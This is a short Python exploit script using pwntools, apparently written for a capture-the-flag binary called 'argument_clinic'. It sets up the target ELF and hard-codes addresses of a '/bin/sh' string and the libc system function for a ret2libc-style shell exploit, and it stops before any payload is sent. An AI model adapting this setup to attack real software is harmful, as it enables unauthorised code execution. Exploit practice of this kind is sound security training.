# argument-clinicex.py - Aidan Wech (Onyxymous)
# /problems/argument-clinic_3_499397cabc327f6aa99ca6c8eba57582/
from pwn import *

# debug info
bin64 = './argument_clinic'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# exploit variables
retarg = 9
binsh = 0x7ffff7f64698
system = 0x7ffff7ddcd60
